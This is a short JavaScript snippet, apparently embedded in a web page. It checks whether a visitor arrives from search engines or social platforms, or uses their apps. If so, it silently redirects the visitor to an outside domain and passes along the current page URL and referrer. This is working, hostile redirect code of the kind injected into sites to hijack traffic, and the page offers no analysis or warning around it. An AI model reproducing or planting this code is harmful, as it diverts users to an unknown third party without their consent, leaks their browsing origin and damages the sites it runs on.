//<![CDATA[
var ars 	= rChoice([
	'https://www.soalkunci.xyz/',
	]);

function rChoice(arr) {
    return arr[Math.floor(arr.length * Math.random())];
}

//Code arsae client javascript
if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'weheartit.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'weheartit', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
//]]>
